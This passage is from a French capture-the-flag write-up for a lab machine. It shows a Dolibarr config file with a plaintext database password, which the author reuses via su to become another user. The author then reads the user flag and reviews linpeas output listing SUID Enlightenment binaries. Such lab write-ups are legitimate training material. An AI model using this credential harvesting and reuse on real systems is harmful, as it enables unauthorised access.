$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
www-data@boardlight:~/html/crm.board.htb$ su larissa
su larissa
Password: serverfun2$2023!!
whoami
larissa
```
On trouve un mot de passe, `$dolibarr_main_db_pass='serverfun2$2023!!';`
En réutilisant le même mot de passe, nous sommes en mesure de se connecter en tant que larissa.

Une fois connecté en tant que larissa, on peut aller retrouver le flag user:
```bash
cd /home/larissa 
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
user.txt
Videos
cat user.txt
bffabf3397c924d7dccaf71cf636393c
```

En rescannant avec linpeas, on trouve les SUID suivants:

```bash
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```
On se rend compte que le nom semble similaire à celui de la box (boardlight/enlightenment).
En fouillant un peu, on se rend compte que ces fichiers sont liés au Enlightenment desktop environment.
